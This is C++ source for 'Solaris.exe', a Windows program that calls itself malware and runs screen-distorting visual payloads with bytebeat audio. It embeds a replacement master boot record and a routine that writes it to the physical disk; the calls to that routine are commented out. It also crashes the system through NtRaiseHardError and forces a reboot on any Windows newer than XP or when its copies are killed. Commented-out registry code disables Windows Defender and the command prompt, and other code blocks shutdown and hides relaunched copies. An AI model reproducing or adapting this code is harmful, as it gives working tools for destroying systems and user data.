#include <windows.h>
#include <math.h>
#include <iostream>
#include <thread>

#include "GDIpayloads.h"
#include "stuff.h"
#include "bytebeat.h"

/// <summary>
/// solaris
/// </summary>
/// <param name="h"></param>
/// <param name="hHeap"></param>

//MBR made by RaduMinecraft and thanks to N17Pro3426 for compiled MBR
const unsigned char MasterBootRecord[] = {
  0xe8, 0x3b, 0x00, 0xe8, 0x43, 0x00, 0xe8, 0x9d, 0x01, 0xe8, 0x5e, 0x00,
  0xe8, 0x97, 0x01, 0xe8, 0x79, 0x00, 0xe8, 0x91, 0x01, 0xe8, 0x94, 0x00,
  0xe8, 0x8b, 0x01, 0xe8, 0xaf, 0x00, 0xe8, 0x85, 0x01, 0xe8, 0xca, 0x00,
  0xe8, 0x7f, 0x01, 0xe8, 0xe7, 0x00, 0xe8, 0x79, 0x01, 0xe8, 0x04, 0x01,
  0xe8, 0x73, 0x01, 0xe8, 0x21, 0x01, 0xe8, 0x28, 0x01, 0xe8, 0x2b, 0x01,
  0xeb, 0xfe, 0xb8, 0x13, 0x00, 0xcd, 0x10, 0xb8, 0x00, 0xa0, 0x8e, 0xc0,
  0xc3, 0x31, 0xc9, 0x31, 0xd2, 0x31, 0xff, 0x89, 0xcb, 0x31, 0xd3, 0x26,
  0x88, 0x1d, 0x83, 0xc7, 0x01, 0x41, 0x81, 0xf9, 0x40, 0x01, 0x7c, 0xef,
  0x31, 0xc9, 0x42, 0x81, 0xfa, 0xc8, 0x00, 0x7c, 0xe6, 0xc3, 0x31, 0xc9,
  0x31, 0xd2, 0x31, 0xff, 0x89, 0xcb, 0x21, 0xd3, 0x26, 0x88, 0x1d, 0x83,
  0xc7, 0x01, 0x41, 0x81, 0xf9, 0x40, 0x01, 0x7c, 0xef, 0x31, 0xc9, 0x42,
  0x81, 0xfa, 0xc8, 0x00, 0x7c, 0xe6, 0xc3, 0x31, 0xc9, 0x31, 0xd2, 0x31,
  0xff, 0x89, 0xcb, 0x09, 0xd3, 0x26, 0x88, 0x1d, 0x83, 0xc7, 0x01, 0x41,
  0x81, 0xf9, 0x40, 0x01, 0x7c, 0xef, 0x31, 0xc9, 0x42, 0x81, 0xfa, 0xc8,
  0x00, 0x7c, 0xe6, 0xc3, 0x31, 0xc9, 0x31, 0xd2, 0x31, 0xff, 0x89, 0xc8,
  0x01, 0xd3, 0x26, 0x88, 0x1d, 0x83, 0xc7, 0x01, 0x41, 0x81, 0xf9, 0x40,
  0x01, 0x7c, 0xef, 0x31, 0xc9, 0x42, 0x81, 0xfa, 0xc8, 0x00, 0x7c, 0xe6,
  0xc3, 0x31, 0xc9, 0x31, 0xd2, 0x31, 0xff, 0x89, 0xcb, 0x01, 0xd3, 0x26,
  0x88, 0x1d, 0x83, 0xc7, 0x01, 0x41, 0x81, 0xf9, 0x40, 0x01, 0x7c, 0xef,
  0x31, 0xc9, 0x42, 0x81, 0xfa, 0xc8, 0x00, 0x7c, 0xe6, 0xc3, 0x31, 0xc9,
  0x31, 0xd2, 0x31, 0xff, 0x89, 0xcb, 0x01, 0xd3, 0x09, 0xd3, 0x26, 0x88,
  0x1d, 0x83, 0xc7, 0x01, 0x41, 0x81, 0xf9, 0x40, 0x01, 0x7c, 0xed, 0x31,
  0xc9, 0x42, 0x81, 0xfa, 0xc8, 0x00, 0x7c, 0xe4, 0xc3, 0x31, 0xc9, 0x31,
  0xd2, 0x31, 0xff, 0x89, 0xc8, 0x01, 0xd3, 0x21, 0xd3, 0x26, 0x88, 0x1d,
  0x83, 0xc7, 0x01, 0x41, 0x81, 0xf9, 0x40, 0x01, 0x7c, 0xed, 0x31, 0xc9,
  0x42, 0x81, 0xfa, 0xc8, 0x00, 0x7c, 0xe4, 0xc3, 0x31, 0xc9, 0x31, 0xd2,
  0x31, 0xff, 0x21, 0xd3, 0x31, 0xd3, 0x01, 0xd3, 0x26, 0x88, 0x1d, 0x83,
  0xc7, 0x01, 0x41, 0x81, 0xf9, 0x40, 0x01, 0x7c, 0xed, 0x31, 0xc9, 0x42,
  0x81, 0xfa, 0xc8, 0x00, 0x7c, 0xe4, 0xc3, 0x31, 0xff, 0xb9, 0x00, 0xfa,
  0xb0, 0x00, 0xf3, 0xaa, 0xc3, 0xb8, 0x03, 0x00, 0xcd, 0x10, 0xc3, 0xbe,
  0xb3, 0x7d, 0xe8, 0x16, 0x00, 0xac, 0x3c, 0x00, 0x74, 0x10, 0xb4, 0x09,
  0xb7, 0x00, 0xb3, 0x35, 0xb9, 0x01, 0x00, 0xcd, 0x10, 0xe8, 0x0e, 0x00,
  0xeb, 0xeb, 0xc3, 0xb4, 0x02, 0xb7, 0x00, 0x30, 0xf6, 0x30, 0xd2, 0xcd,
  0x10, 0xc3, 0xb4, 0x03, 0xb7, 0x00, 0xcd, 0x10, 0xfe, 0xc2, 0x80, 0xfa,
  0x50, 0x7c, 0x04, 0xfe, 0xc6, 0x30, 0xd2, 0xb4, 0x02, 0xb7, 0x00, 0xcd,
  0x10, 0xc3, 0xb9, 0x0a, 0x00, 0xb4, 0x86, 0xba, 0x4b, 0x4c, 0xcd, 0x15,
  0xe2, 0xf7, 0xc3, 0x57, 0x45, 0x20, 0x41, 0x52, 0x45, 0x20, 0x47, 0x45,
  0x54, 0x54, 0x49, 0x4e, 0x47, 0x20, 0x46, 0x52, 0x45, 0x45, 0x20, 0x53,
  0x4f, 0x4c, 0x41, 0x52, 0x49, 0x53, 0x20, 0x57, 0x49, 0x54, 0x48, 0x20,
  0x54, 0x48, 0x49, 0x53, 0x20, 0x4f, 0x4e, 0x45, 0x21, 0x21, 0x21, 0x21,
  0x21, 0x21, 0x20, 0x3b, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa
};

VOID WINAPI SetRegistryKey(DWORD val, HKEY key, LPCSTR path, LPCSTR name) {
    HKEY hKey;
    LONG reg = RegOpenKeyExA(key, path, 0, KEY_ALL_ACCESS, &hKey);
    reg = RegSetValueExA(hKey, name, 0, REG_DWORD, (LPBYTE)&val, sizeof(DWORD));
    RegCloseKey(hKey);
}

VOID WINAPI mbr() {
    DWORD writtenBytes;
    HANDLE physicalDrive0 = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    
    WriteFile(physicalDrive0, MasterBootRecord, 512, &writtenBytes, 0);
    CloseHandle(physicalDrive0);
}

VOID WINAPI killMessage() {
    MessageBoxA(0, "Solaris.exe will now terminate the system", "Fatal error", MB_OK | MB_ICONERROR);
}

VOID WINAPI killMessage2() {
    MessageBoxA(0, "This Solaris.exe is only for Windows XP.\r\nDestroying the bootloader in progress...", "Fatal error", MB_OK | MB_ICONERROR);
}

typedef NTSTATUS(NTAPI* RtlAdjustPrivilegeFunc)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* NtRaiseHardErrorFunc)(NTSTATUS, ULONG, PULONG, PULONG, ULONG, PULONG);

void bsod() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) return;

    RtlAdjustPrivilegeFunc RtlAdjustPrivilege = (RtlAdjustPrivilegeFunc)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    NtRaiseHardErrorFunc NtRaiseHardError = (NtRaiseHardErrorFunc)GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege && NtRaiseHardError) {
        BOOLEAN boolean = FALSE;
        ULONG response;

        RtlAdjustPrivilege(19, TRUE, FALSE, &boolean);

        NtRaiseHardError(0xCDEAD666, 0, NULL, NULL, 6, &response);
    }

    FreeLibrary(ntdll);

    HANDLE token;
    TOKEN_PRIVILEGES privileges;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
        privileges.PrivilegeCount = 1;
        privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(token, FALSE, &privileges, 0, NULL, 0);
        CloseHandle(token);

        ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
    }
}

VOID WINAPI end() {
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)killMessage, 0, 0, 0);
    Sleep(2000);
    bsod();
}

VOID WINAPI end2() {
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)killMessage2, 0, 0, 0);
    Sleep(2000);
    bsod();
}

DWORD WINAPI processNumber(LPVOID lpParam) {
    wchar_t path[MAX_PATH];

    DWORD length = GetModuleFileName(nullptr, path, MAX_PATH);

    if (length == 0) {
        ExitProcess(0);
    }

    path[length] = L'\0';

    wchar_t* executableName = wcsrchr(path, L'\\');
    if (executableName) {
        executableName++;
    }
    else {
        ExitProcess(0);
    }

    Sleep(1000);

    while (true) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (snapshot == INVALID_HANDLE_VALUE) {
            ExitProcess(0);
            return 1;
        }

        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(snapshot, &processEntry)) {
            int notepadCount = 0;

            do {
                if (wcscmp(processEntry.szExeFile, executableName) == 0) {
                    notepadCount++;
                }
            } while (Process32Next(snapshot, &processEntry));

            if (notepadCount < 3) {
                end();
            }

            if (notepadCount > 4) {
                end();
            }
        }
        else {
            ExitProcess(0);
        }

        CloseHandle(snapshot);
        Sleep(400);
    }
    return 0;
}

void processCreate(LPCWSTR arguments) {
    wchar_t path[MAX_PATH];
    DWORD length = GetModuleFileName(nullptr, path, MAX_PATH);
    if (length == 0) {
        ExitProcess(0);
    }
    path[length] = L'\0';

    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    startupInfo.wShowWindow = SW_HIDE;

    std::wstring commandLine = std::wstring(path) + L" " + arguments;

    if (CreateProcess(path, const_cast<LPWSTR>(commandLine.c_str()), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &startupInfo, &processInfo)) {
        SetPriorityClass(processInfo.hProcess, HIGH_PRIORITY_CLASS);
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
    }
    else {
        ExitProcess(0);
    }

    return;
}

LRESULT CALLBACK proc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_QUERYENDSESSION:
        return FALSE;
    case WM_ENDSESSION:
        MessageBox(hwnd, L"", L"", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
        return 0;
    case WM_CLOSE:
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}

DWORD WINAPI noClose(LPVOID lpvoid) {
    HINSTANCE hInstance = reinterpret_cast<HINSTANCE>(lpvoid);
    WNDCLASS wc = {};
    wc.lpfnWndProc = proc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"class";

    RegisterClass(&wc);

    HWND mainWindow = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOOLWINDOW, L"class", L"",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, hInstance, 0);

    if (mainWindow == 0) {
        ExitProcess(0);
    }

    ShowWindow(mainWindow, SW_SHOW);
    SetLayeredWindowAttributes(mainWindow, RGB(0, 0, 0), 0, LWA_ALPHA);

    MSG msg = { };
    while (GetMessage(&msg, 0, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

void CheckOSVersion() {
    OSVERSIONINFO osvi = { sizeof(OSVERSIONINFO) };
    GetVersionEx(&osvi);

    if (osvi.dwMajorVersion > 5 || (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion > 1)) {
        end2();
    }
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char* cmdLine = GetCommandLineA();

    if (strstr(cmdLine, "-start") != nullptr) {
        Sleep(1000);
        CreateThread(0, 0, processNumber, 0, 0, 0);

        Sleep(INFINITE);
    }
    else if (strstr(cmdLine, "-s") != nullptr) {
        //mbr();

        //SetRegistryKey(2, HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD");
        //SetRegistryKey(1, HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware");
        //SetRegistryKey(1, HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus");
        //SetRegistryKey(0, HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring");

        //CreateThread(0, 0, noClose, 0, 0, 0);
        Sleep(1000);
        CreateThread(0, 0, processNumber, 0, 0, 0);

        bytebeat_1();
        HANDLE payload1 = CreateThread(0, 0, firstPayload, 0, 0, 0);
        Sleep(40000);
        KillPayload(payload1);
        RedrawScreen(0);

        bytebeat_2();
        HANDLE payload2a = CreateThread(0, 0, hueNoShift, 0, 0, 0);
        HANDLE payload2b = CreateThread(0, 0, SquaresRGB, 0, 0, 0);
        HANDLE payload2c = CreateThread(0, 0, waves, 0, 0, 0);
        Sleep(15000);
        KillPayload(payload2c);
        HANDLE payload2d = CreateThread(0, 0, xWaves, 0, 0, 0);
        Sleep(15000);
        KillPayload(payload2a);
        KillPayload(payload2b);
        KillPayload(payload2d);
        RedrawScreen(0);

        bytebeat_3();
        HANDLE payload3a = CreateThread(0, 0, goodCubes, 0, 0, 0);
        HANDLE payload3b = CreateThread(0, 0, thirdPayload, 0, 0, 0);
        Sleep(10000);
        HANDLE payload3c = CreateThread(0, 0, highWaves, 0, 0, 0);
        Sleep(10000);
        KillPayload(payload3a);
        KillPayload(payload3b);
        KillPayload(payload3c);
        RedrawScreen(0);

        bytebeat_4();
        HANDLE payload4a = CreateThread(0, 0, shapesPayload, 0, 0, 0);
        HANDLE payload4b = CreateThread(0, 0, colorShift2, 0, 0, 0);
        Sleep(10000);
        KillPayload(payload4a);
        KillPayload(payload4b);
        RedrawScreen(0);

        bytebeat_5();
        HANDLE payload5a = CreateThread(0, 0, stretch, 0, 0, 0);
        Sleep(20000);
        KillPayload(payload5a);
        RedrawScreen(0);

        bytebeat_6();
        HANDLE payload6a = CreateThread(0, 0, cube, 0, 0, 0);
        HANDLE payload6b = CreateThread(0, 0, brightWaves, 0, 0, 0);
        Sleep(5000);
        HANDLE payload6c = CreateThread(0, 0, circlePayload, 0, 0, 0);
        HANDLE payload6d = CreateThread(0, 0, circle, 0, 0, 0);
        Sleep(25000);
        KillPayload(payload6a);
        KillPayload(payload6b);
        KillPayload(payload6c);
        KillPayload(payload6d);
        RedrawScreen(0);

        bytebeat_8();
        HANDLE payload11a = CreateThread(0, 0, highWaves, 0, 0, 0);
        Sleep(5000);
        HANDLE payload11b = CreateThread(0, 0, circle, 0, 0, 0);
        HANDLE payload11c = CreateThread(0, 0, cube, 0, 0, 0);
        Sleep(15000);
        KillPayload(payload11a);
        KillPayload(payload11b);
        KillPayload(payload11c);

        bytebeat_7();
        HANDLE payload7a = CreateThread(0, 0, Shake, 0, 0, 0);
        Sleep(5000);
        KillPayload(payload7a);
        HANDLE payload7b = CreateThread(0, 0, colorShift, 0, 0, 0);
        Sleep(5000);
        KillPayload(payload7b);
        HANDLE payload7c = CreateThread(0, 0, coloredPixels, 0, 0, 0);
        Sleep(10000);
        HANDLE payload7d = CreateThread(0, 0, colors, 0, 0, 0);
        Sleep(40000);
        KillPayload(payload7c);
        KillPayload(payload7d);
        RedrawScreen(0);

        bytebeat_11();
        HANDLE payload8a = CreateThread(0, 0, goodCubes, 0, 0, 0);
        HANDLE payload8b = CreateThread(0, 0, cubesCurcle, 0, 0, 0);
        Sleep(10000);
        KillPayload(payload8a);
        KillPayload(payload8b);
        HANDLE payload8c = CreateThread(0, 0, Shake, 0, 0, 0);
        HANDLE payload8d = CreateThread(0, 0, white, 0, 0, 0);
        Sleep(10000);
        KillPayload(payload8c);
        KillPayload(payload8d);
        RedrawScreen(0);

        bytebeat_12();
        HANDLE payload10a = CreateThread(0, 0, colorRectangles, 0, 0, 0);
        HANDLE payload10b = CreateThread(0, 0, invert, 0, 0, 0);
        HANDLE payload10c = CreateThread(0, 0, goodCubes, 0, 0, 0);
        Sleep(10000);
        KillPayload(payload10a);
        KillPayload(payload10b);
        KillPayload(payload10c);
        HANDLE payload10d = CreateThread(0, 0, xWaves, 0, 0, 0);
        HANDLE payload10e = CreateThread(0, 0, hueCircle2, 0, 0, 0);
        Sleep(5000);
        HANDLE payload10f = CreateThread(0, 0, dizzy2, 0, 0, 0);
        Sleep(15000);
        KillPayload(payload10d);
        KillPayload(payload10e);
        KillPayload(payload10f);
        RedrawScreen(0);

        bytebeat_13();
        HANDLE payload9e = CreateThread(0, 0, lastShader, 0, 0, 0);
        HANDLE payload9a = CreateThread(0, 0, dizzy3, 0, 0, 0);
        Sleep(10000);
        KillPayload(payload9a);
        HANDLE payload9b = CreateThread(0, 0, lastBrightWaves, 0, 0, 0);
        Sleep(5000);
        KillPayload(payload9e);
        HANDLE payload9c = CreateThread(0, 0, lastWaves, 0, 0, 0);
        Sleep(5000);
        KillPayload(payload9c);
        HANDLE payload9d = CreateThread(0, 0, lastSineWaves, 0, 0, 0);
        Sleep(40000);
        ExitProcess(0);
    }
    else {
        if (MessageBoxA(0, "This malware called Solaris.exe (also inspired from the original Solaris.exe made by Nikitpad and Solarum.exe made by JavaSocketException) is the \"best\" project that I made. This malware was made over 4 weeks in C++ with the help of N17Pro3426 for compiling the MBR into hex code (the MBR is made by RaduMinecraft). I hope this malware is good like the original one. \"Yes\" - continue, \"No\" - keep your PC safe.", "\"solaris.exe solaris.exe solaris.exe solaris.exe solaris.exe solaris.exe solaris.exe solaris.exe solaris.exe\"", MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) != IDYES) {
            ExitProcess(0);
        }
        else {
            if (MessageBoxA(0, "Unlike normal software, this type of software is called malware. This program is able to modify registries, overwrite the MBR (the bootloader of the OS), and perform other destructive and irreversible actions. The creator doesn't have any responsibility for making your computer unbootable. I HOPE YOU WILL LIKE SOLARIS.EXE SOLARIS.EXE SOLARIS.EXE SOLARIS.EXE SOLARIS.EXE SOLARIS.EXE SOLARIS.EXE. Click \"No\" to exit.", "FINAL WARNING", MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) != IDYES) {
                ExitProcess(0);
            }
            else {
                //mbr();
                CheckOSVersion();
                processCreate(L"-s");
                for (int i = 0; i < 2; i++) {
                    processCreate(L"-start");
                }
                return 0;
            }
        }
    }
    return 0;
}